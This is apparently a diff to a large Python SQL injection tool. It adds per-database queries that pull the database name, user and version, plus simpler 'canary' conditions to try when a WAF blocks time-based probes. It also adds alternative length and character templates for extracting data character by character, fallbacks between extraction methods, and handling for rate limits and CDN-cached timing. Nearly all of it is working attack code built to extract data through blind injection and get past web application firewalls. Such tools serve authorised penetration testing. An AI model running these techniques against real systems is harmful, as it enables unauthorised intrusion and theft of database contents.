@@ -62342,18 +62342,26 @@ class Scanner:
                              or getattr(cfg, "dbms", None) or getattr(cfg, "forced_dbms", None)
                              or "MySQL")
                 _tbe_sql_map = {
-                    "MySQL":       "SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())",
-                    "MariaDB":     "SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())",
-                    "PostgreSQL":  "SELECT current_database()||'|'||current_user||'|'||version()",
-                    "CockroachDB": "SELECT current_database()||'|'||current_user||'|'||version()",
-                    "MSSQL":       "SELECT DB_NAME()+'|'+SYSTEM_USER+'|'+@@VERSION",
-                    "Sybase":      "SELECT DB_NAME()+'|'+SUSER_NAME()+'|'+@@VERSION",
-                    "Oracle":      "SELECT SYS_CONTEXT('USERENV','DB_NAME')||'|'||USER||'|'||(SELECT banner FROM v$version WHERE ROWNUM=1) FROM dual",
-                    "SQLite":      "SELECT 'main|sqlite_user|'||sqlite_version()",
-                    "DB2":         "SELECT CURRENT_SCHEMA||'|'||CURRENT_USER||'|'||SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())",
+                    "MySQL":          "SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())",
+                    "MariaDB":        "SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())",
+                    "TiDB":           "SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())",
+                    "PostgreSQL":     "SELECT current_database()||'|'||current_user||'|'||version()",
+                    "CockroachDB":    "SELECT current_database()||'|'||current_user||'|'||version()",
+                    "YugabyteDB":     "SELECT current_database()||'|'||current_user||'|'||version()",
+                    "Amazon Redshift":"SELECT current_database||'|'||current_user||'|'||version()",
+                    "MSSQL":          "SELECT DB_NAME()+'|'+SYSTEM_USER+'|'+@@VERSION",
+                    "Sybase":         "SELECT DB_NAME()+'|'+SUSER_NAME()+'|'+@@VERSION",
+                    "Oracle":         "SELECT SYS_CONTEXT('USERENV','DB_NAME')||'|'||USER||'|'||(SELECT banner FROM v$version WHERE ROWNUM=1) FROM dual",
+                    "SQLite":         "SELECT 'main|sqlite_user|'||sqlite_version()",
+                    "DB2":            "SELECT CURRENT_SCHEMA||'|'||CURRENT_USER||'|'||SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())",
+                    "Informix":       "SELECT DBINFO('dbname','') FROM systables WHERE ROWCOUNT=1",
+                    "Ingres":         "SELECT dbmsinfo('database')",
                 }
+                # BUG-TBE-DEFAULT-FALLBACK-FIX: Generic fallback used MySQL-specific CONCAT()
+                # which raises errors on MSSQL (no CONCAT before 2012), Oracle, and others.
+                # Use || concatenation as most portable fallback; real per-DBMS handling above.
                 _tbe_query = _tbe_sql_map.get(_tbe_dbms,
-                    f"SELECT CONCAT(database(),'|',CURRENT_USER(),'|',VERSION())")
+                    "SELECT current_database()||'|'||current_user||'|'||version()")
                 _tb_result = await _time_based_extract(
                     enum.engine, cfg, enum.result,
                     _tbe_query,
@@ -107481,7 +107489,14 @@ class TechniqueCascadeEngine:
                             _bl_status = getattr(_bl_first, "status_code", 0) or getattr(_bl_first, "status", 0)
             elif hasattr(baseline, "status_code"):
                 _bl_status = baseline.status_code
-        _bl_size = len(norm_base) if norm_base else 0
+        # BUG-NORMBASE-SIZE-EMPTY FIX: When norm_base=b"" (stub passed from
+        # _pcv_gate_surface), _bl_size was always 0, making _is_error_page True for
+        # ANY 4xx response — even when the live baseline probe (_bl_fp) returned a
+        # normal-sized page. Fall back to the live probe body size so legitimate pages
+        # are not misclassified as error pages and PCV B/BH/S/HQ confirmations proceed.
+        _bl_size_live = (len(getattr(_bl_fp, 'body', b'') or b'')
+                         if _bl_fp is not None else 0)
+        _bl_size = max(len(norm_base) if norm_base else 0, _bl_size_live)
         # _is_error_page is True only when the clean baseline probe returned a genuine
         # application error, NOT when the WAF itself blocked the probe (which also returns
         # 4xx but with a tiny WAF-challenge body that doesn't represent the page).
@@ -134732,6 +134747,19 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
     """Inner implementation of _time_based_extract — called only from the locked wrapper."""
     t = getattr(config, "time_sec", 5)
     _base_time = baseline.get("mean_timing", 200) if baseline else 200
+    # BUG-CDN-BASETIME-FLOOR-FIX: When CDN serves all baseline probes from cache, the
+    # measured mean_timing is 0ms (edge-cached).  With _base_time=0, _cal_hit() computes:
+    #   _t_heuristic  = 0 * 1.2 + 100 = 100ms
+    #   _t_sleep_rel  = 0 + t * 1000 * 0.4 = 2000ms (for t=5)
+    #   threshold = min(100, 2000) = 100ms
+    # Any network jitter > 100ms for a FALSE-condition probe would register as a
+    # timing hit — corrupting calibration with a false threshold close to 100ms.
+    # Fix: floor _base_time at 100ms so calibration thresholds are realistic.
+    # Real backend responses on zero-latency CDN edge still take 100–300ms origin RTT.
+    if _base_time < 100:
+        LOG.info("[TBExtract] CDN-zeroed baseline (%.0fms) — flooring at 100ms to prevent "
+                 "false calibration hits from network jitter", _base_time)
+        _base_time = 100
     # Capture detection technique so timing_payload() can choose HQ variants (generate_series)
     # vs sleep-based variants (pg_sleep/SLEEP) — both are closed over by timing_payload().
     _tp_technique = getattr(result, 'technique', '') or ''
@@ -135417,9 +135445,62 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                          f"actual={_std_ms:.0f}ms canary={_canary_ms:.0f}ms  extraction OK")
                 _std_cal_ok = True
             else:
-                LOG.warning(f"[TBExtract] Standard calibrated ({_std_ms:.0f}ms) but "
-                            f"WAF blocks extraction conditions (canary={_canary_ms:.0f}ms) "
-                            " falling through to EBF")
+                # BUG-CANARY-WAF-BLOCK-FIX: WAF blocks ASCII/SUBSTRING inside CASE WHEN
+                # even when 1=1 timing passes. Before triggering EBF (50-150 probes, 600s),
+                # try progressively simpler constant-only canary conditions. These use only
+                # numeric literals or simple comparisons that deep-inspection WAFs should pass.
+                _simple_canaries = []
+                if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    _simple_canaries = [
+                        "1=1",
+                        "2>1",
+                        "LENGTH('AB')>1",
+                        "LENGTH(current_database())>0",
+                    ]
+                elif dbms in ("MySQL", "MariaDB"):
+                    _simple_canaries = [
+                        "1=1",
+                        "2>1",
+                        "LENGTH('AB')>1",
+                        "LENGTH(@@version)>0",
+                    ]
+                elif dbms == "MSSQL":
+                    _simple_canaries = [
+                        "1=1",
+                        "2>1",
+                        "LEN('AB')>1",
+                        "LEN(@@servername)>0",
+                    ]
+                elif dbms == "Oracle":
+                    _simple_canaries = [
+                        "1=1",
+                        "2>1",
+                        "LENGTH('AB')>1",
+                    ]
+                elif dbms == "SQLite":
+                    _simple_canaries = [
+                        "1=1",
+                        "2>1",
+                        "LENGTH('AB')>1",
+                    ]
+                else:
+                    _simple_canaries = ["1=1", "2>1"]
+                _simple_cal_ok = False
+                for _sc in _simple_canaries:
+                    _sc_ms = await _calibrate_probe(timing_payload(_sc), tamper_chain)
+                    if _sc_ms >= timing_thresh:
+                        LOG.info(f"[TBExtract] Simple canary '{_sc}' passed "
+                                 f"({_sc_ms:.0f}ms >= {timing_thresh:.0f}ms) — "
+                                 "WAF allows numeric/LENGTH conditions; proceeding")
+                        _std_cal_ok = True
+                        _simple_cal_ok = True
+                        # Replace extraction canary with this simpler working condition
+                        _canary_cond = _sc
+                        break
+                if not _simple_cal_ok:
+                    LOG.warning(f"[TBExtract] Standard calibrated ({_std_ms:.0f}ms) but "
+                                f"WAF blocks extraction conditions (canary={_canary_ms:.0f}ms) "
+                                " falling through to EBF")
         if _std_cal_ok:
             pass  # proceed to extraction with standard template
         elif _det_payload_raw:
@@ -140099,11 +140180,96 @@ class ExtractionOrchestrator:
 
         _thresh = self._dt_thresh
 
+        # BUG-TH-UNIFORM-TIMING-FIX: WAF challenge pages are served from edge cache
+        # at a uniform latency (e.g., 323ms ± 1ms for every probe — regardless of whether
+        # the timing payload fired).  When TRUE/FALSE conditions both return ~323ms, the
+        # oracle has no discriminating power: every comparison converges to the wrong branch.
+        # Track the last N probe elapsed_ms values; if all are within ±5ms of each other,
+        # the oracle is "uniformly stale" — return None to trigger dead-probe fallback.
+        _recent_ms: list = []
+        _UNIFORM_WINDOW = 8   # consecutive probes needed to declare stale oracle
+        _UNIFORM_TOL_MS = 5.0  # ms tolerance for "identical"
+
         async def _eval(cond: str):
             ms = await _probe(cond)
             if ms < 30:
                 return None
+            # Uniform-stale detection
+            _recent_ms.append(ms)
+            if len(_recent_ms) > _UNIFORM_WINDOW:
+                _recent_ms.pop(0)
+            if len(_recent_ms) >= _UNIFORM_WINDOW:
+                _win_min = min(_recent_ms)
+                _win_max = max(_recent_ms)
+                if _win_max - _win_min <= _UNIFORM_TOL_MS:
+                    LOG.warning(
+                        "[DetTemplate] Uniform-timing oracle detected: last %d probes "
+                        "all in %.1f..%.1fms (±%.1fms) — WAF challenge page; aborting",
+                        _UNIFORM_WINDOW, _win_min, _win_max, _win_max - _win_min)
+                    return None
             return ms >= _thresh
+
+        # ── Alternative length templates (WAF bypass fallback) ───────────────
+        # BUG-DEADPROBE-LTPL-FIX: WAF may block the primary length function
+        # (CHAR_LENGTH, ISNULL(DATALENGTH...)/2, LENGTHC etc.) inside the timing
+        # CASE-WHEN expression even when the 1=1 calibration probe passes.  Build a
+        # list of fallback length templates per DBMS so we can retry with alternatives
+        # before giving up with return "".
+        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            _ltpl_alts = [
+                "LENGTH({lq})>={m}",
+                "OCTET_LENGTH({lq})>={m}",
+                "({lq} IS NOT NULL AND CHAR_LENGTH({lq})>={m})",
+                "CHAR_LENGTH(COALESCE({lq},''))>={m}",
+            ]
+            _ctpl_alts = [
+                "ASCII(SUBSTRING(COALESCE({lq},''),{p},1))>={m}",
+                "GET_BYTE(CONVERT_TO(SUBSTRING({lq},{p},1),'UTF8'),0)>={m}",
+                "ASCII(SUBSTR({lq},{p},1))>={m}",
+            ]
+        elif _dbms in ("MySQL", "MariaDB", "TiDB"):
+            _ltpl_alts = [
+                "LENGTH({lq})>={m}",
+                "CHAR_LENGTH(IFNULL({lq},''))>={m}",
+                "BIT_LENGTH({lq})/8>={m}",
+            ]
+            _ctpl_alts = [
+                "ORD(SUBSTRING({lq},{p},1))>={m}",
+                "ASCII(MID({lq},{p},1))>={m}",
+            ]
+        elif _dbms == "MSSQL":
+            _ltpl_alts = [
+                "LEN({lq})>={m}",
+                "ISNULL(LEN({lq}),0)>={m}",
+                "DATALENGTH({lq})>={m}",
+            ]
+            _ctpl_alts = [
+                "ASCII(SUBSTRING({lq},{p},1))>={m}",
+                "UNICODE(SUBSTRING(ISNULL({lq},''),{p},1))>={m}",
+            ]
+        elif _dbms == "Oracle":
+            _ltpl_alts = [
+                "LENGTH({lq})>={m}",
+                "VSIZE({lq})>={m}",
+                "NVL(LENGTH({lq}),0)>={m}",
+            ]
+            _ctpl_alts = [
+                "ASCII(SUBSTR({lq},{p},1))>={m}",
+                "NVL(ASCII(SUBSTR({lq},{p},1)),0)>={m}",
+            ]
+        elif _dbms == "SQLite":
+            _ltpl_alts = [
+                "COALESCE(LENGTH({lq}),0)>={m}",
+                "LENGTH(COALESCE({lq},''))>={m}",
+            ]
+            _ctpl_alts = [
+                "UNICODE(SUBSTR({lq},{p},1))>={m}",
+            ]
+        else:
+            _ltpl_alts = [
+                "LENGTH({lq})>={m}",
+            ]
+            _ctpl_alts = []
 
         # ── Length via binary search ───────────────────────────────────────
         # BUG-LIMIT-ONE FIX: wrap sql_query with _limit_one() so the subquery
@@ -140120,7 +140286,23 @@ class ExtractionOrchestrator:
                 await asyncio.sleep(_delay)
                 r = await _eval(_ltpl.format(lq=_lq, m=mid + 1))
                 if r is None:
-                    return ""   # Oracle dead — abort cleanly
+                    # BUG-DEADPROBE-LTPL-FIX: Primary length template is WAF-blocked.
+                    # Try alternative length templates before aborting.
+                    _ltpl_switched = False
+                    for _alt_ltpl in _ltpl_alts:
+                        _alt_r = await _eval(_alt_ltpl.format(lq=_lq, m=mid + 1))
+                        if _alt_r is not None:
+                            LOG.info("[DetTemplate] Primary _ltpl WAF-blocked; "
+                                     "switching to alt: %s", _alt_ltpl)
+                            _ltpl = _alt_ltpl
+                            r = _alt_r
+                            _ltpl_switched = True
+                            break
+                        await asyncio.sleep(_delay * 0.3)
+                    if not _ltpl_switched:
+                        LOG.warning("[DetTemplate] All length templates dead — "
+                                    "WAF blocks all length functions, aborting")
+                        return ""   # Oracle dead — abort cleanly
             if r: lo = mid + 1
             else: hi = mid
             await asyncio.sleep(_delay * 0.5)
@@ -140184,12 +140366,26 @@ class ExtractionOrchestrator:
                     await asyncio.sleep(_delay)
                     r = await _eval(_ctpl.format(lq=_lq, p=pos, m=mid_c + 1))
                     if r is None:
-                        _char_oracle_failures += 1
-                        if _char_oracle_failures >= 2:
-                            # Oracle consistently dead — stop extraction
-                            LOG.warning("[DetTemplate] Oracle dead at pos=%d, stopping", pos)
-                            return "".join(chars)
-                        break   # Skip this character position
+                        # BUG-DEADPROBE-CTPL-FIX: Primary char template WAF-blocked.
+                        # Try alternative char templates before counting a failure.
+                        _ctpl_switched = False
+                        for _alt_ctpl in _ctpl_alts:
+                            _alt_r = await _eval(_alt_ctpl.format(lq=_lq, p=pos, m=mid_c + 1))
+                            if _alt_r is not None:
+                                LOG.info("[DetTemplate] Primary _ctpl WAF-blocked at pos=%d; "
+                                         "switching to alt: %s", pos, _alt_ctpl)
+                                _ctpl = _alt_ctpl
+                                r = _alt_r
+                                _ctpl_switched = True
+                                break
+                            await asyncio.sleep(_delay * 0.3)
+                        if not _ctpl_switched:
+                            _char_oracle_failures += 1
+                            if _char_oracle_failures >= 2:
+                                # Oracle consistently dead — stop extraction
+                                LOG.warning("[DetTemplate] Oracle dead at pos=%d, stopping", pos)
+                                return "".join(chars)
+                            break   # Skip this character position
                 if r: lo_c = mid_c + 1
                 else: hi_c = mid_c
                 await asyncio.sleep(_delay)
@@ -141106,6 +141302,28 @@ class ExtractionOrchestrator:
                 raise
             except Exception as _dt_e:
                 LOG.warning("[Orchestrator] Detection-template extraction failed: %s", _dt_e)
+            # BUG-TIMING-DT-FALLBACK-FIX: When _extract_via_detection_template returns ""
+            # (dead probes / WAF blocks all length+char functions), fall back to
+            # _time_based_extract which uses the full detection payload template from
+            # result.payload_raw and has its own EBF bypass finder — a completely
+            # different code path with different function dispatch.  This avoids the
+            # hard stop of return "" and gives T/TH/HQ injections a second extraction
+            # attempt via the sleep-calibration path.
+            LOG.info("[Orchestrator] Falling back to _time_based_extract for %s", technique)
+            try:
+                _tbe_result = await _time_based_extract(
+                    self.engine, self.config, self.result, sql_query,
+                    self.method, self.url, self.data, self.data_fmt,
+                    self.original, self.tamper_chain, dbms, self.baseline)
+                if _tbe_result:
+                    LOG.info("[Orchestrator] _time_based_extract fallback succeeded: %s",
+                             _tbe_result[:40])
+                    return _tbe_result
+                LOG.info("[Orchestrator] _time_based_extract fallback also empty")
+            except asyncio.CancelledError:
+                raise
+            except Exception as _tbe_e:
+                LOG.warning("[Orchestrator] _time_based_extract fallback failed: %s", _tbe_e)
             return ""
 
         #  Method 5: BitwiseExtractor 
@@ -162695,10 +162913,22 @@ class ConditionalErrorOracle:
                         # causing calibrate() to always exhaust all templates and return
                         # False. This permanently broke ConditionalErrorOracle.evaluate()
                         # for all DBMSes — the error oracle never confirmed injection.
-                        _true_err = (_get_safe_status_code(_fp_t) >= 500 or
-                                     _get_safe_status_code(_fp_t) != self._baseline_status)
-                        _false_ok = (_get_safe_status_code(_fp_f) < 500 and
-                                     _get_safe_status_code(_fp_f) == self._baseline_status)
+                        _t_st = _get_safe_status_code(_fp_t)
+                        _f_st = _get_safe_status_code(_fp_f)
+                        # BUG-CEO-429-FIX: When WAF rate-limits BOTH probes (429/503), the
+                        # true/false status codes are identical — both non-200 — causing
+                        # _true_err=True and _false_ok=False, which is correct but means
+                        # ALL templates fail and calibrate() returns False silently.
+                        # Detect this: if both probes are rate-limited, skip this template
+                        # iteration rather than wasting it on a non-evaluable pair.
+                        if _t_st in (429, 503) and _f_st in (429, 503):
+                            print(f"[!] [ErrorOracle] Both probes rate-limited "
+                                  f"({_t_st}/{_f_st}) — WAF blocking all; "
+                                  f"skipping template (ctx={_prefix!r} tpl={tpl[:40]!r})",
+                                  flush=True)
+                            continue
+                        _true_err = (_t_st >= 500 or _t_st != self._baseline_status)
+                        _false_ok = (_f_st < 500 and _f_st == self._baseline_status)
                         if _true_err and _false_ok:
                             self._working_template = tpl
                             self._working_prefix   = _prefix  # BUG-CEO-1 FIX: persist context
